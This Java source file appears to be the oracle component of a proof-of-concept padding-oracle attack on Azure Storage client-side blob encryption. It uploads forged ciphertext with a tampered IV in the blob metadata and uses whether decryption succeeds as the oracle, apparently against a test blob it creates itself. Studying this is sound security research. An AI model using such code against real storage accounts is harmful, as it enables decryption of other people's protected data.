package net.keymaterial.azure.storage;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

import com.azure.core.cryptography.AsyncKeyEncryptionKey;
import com.azure.storage.blob.BlobClient;
import com.azure.storage.blob.BlobClientBuilder;
import com.azure.storage.blob.specialized.cryptography.EncryptedBlobClient;
import com.azure.storage.blob.specialized.cryptography.EncryptedBlobClientBuilder;
import com.google.gson.Gson;
import com.google.gson.JsonElement;
import com.google.gson.JsonParser;

import net.keymaterial.azure.attack.Oracle;

public class StorageOracle implements Oracle {
	private int guessCounter;
	private String connectionString;
	private AsyncKeyEncryptionKey kek;
	private String container;
	private String blobName;
	private  String metadata;

	public StorageOracle(String plaintext, String container, String blobName, String connectionString,
			AsyncKeyEncryptionKey kek) throws IOException {
		this.guessCounter = 0;
		this.container = container;
		this.blobName = blobName;
		this.connectionString = connectionString;
		this.kek = kek;
		EncryptedBlobClient blobClient = new EncryptedBlobClientBuilder().key(kek, "A128KW")
				.connectionString(connectionString).containerName(container).blobName(blobName)
				.buildEncryptedBlobClient();
		if (blobClient.exists()) {
			blobClient.delete();
		}
		InputStream dataStream = new ByteArrayInputStream(plaintext.getBytes(StandardCharsets.UTF_8));

		/*
		 * Create the blob with string (plain text) content.
		 */
		blobClient.upload(dataStream, plaintext.length());

		dataStream.close();
		this.metadata = blobClient.getProperties().getMetadata().get("encryptiondata");
	}

	@Override
	public byte[] retrieveChallengeCiphertext() {
		BlobClient unencryptedClient = new BlobClientBuilder().connectionString(connectionString)
				.containerName(container).blobName(blobName).buildClient();
		ByteArrayOutputStream out = new ByteArrayOutputStream();
		try {
			unencryptedClient.download(out);
			out.close();
		} catch (IOException e) {
			throw new RuntimeException(e);
		}
		return out.toByteArray();
	}

	@Override
	public byte[] retrieveChallengeIv() {
		JsonElement element = JsonParser.parseString(metadata);
		String base64 = element.getAsJsonObject().get("ContentEncryptionIV").getAsString();
		return Base64.getDecoder().decode(base64);
	}

	@Override
	public boolean attemptDecryption(byte[] iv, byte[] ciphertext) {
		guessCounter++;
		try {
			// Upload ciphertext
			String guessName = blobName + "-guess-" + guessCounter;
			BlobClient unencryptedClient = new BlobClientBuilder().connectionString(connectionString)
					.containerName(container).blobName(guessName).buildClient();
			if (unencryptedClient.exists()) {
				unencryptedClient.delete();
			}
			InputStream in = new ByteArrayInputStream(ciphertext);
			unencryptedClient.upload(in, ciphertext.length);
			in.close();
			Map<String, String> modifiedMetaData = new HashMap<>();
			Gson gson = new Gson();
			JsonElement element = JsonParser.parseString(metadata);
			element.getAsJsonObject().addProperty("ContentEncryptionIV", Base64.getEncoder().encodeToString(iv));
			modifiedMetaData.put("encryptiondata", gson.toJson(element));
			unencryptedClient.setMetadata(modifiedMetaData);

			// Attempt download
			EncryptedBlobClient encryptedClient = new EncryptedBlobClientBuilder().key(kek, "A128GCMKW")
					.requiresEncryption(true).connectionString(connectionString).containerName(container)
					.blobName(guessName).buildEncryptedBlobClient();
			ByteArrayOutputStream out = new ByteArrayOutputStream();
			encryptedClient.download(out);
			out.close();
		} catch (IOException | IllegalStateException e) {
			throw new RuntimeException(e);
		} catch (Exception e) {
			return false;
		}
		return true;
	}

	@Override
	public int getNumberOfGuesses() {
		return guessCounter;
	}

}
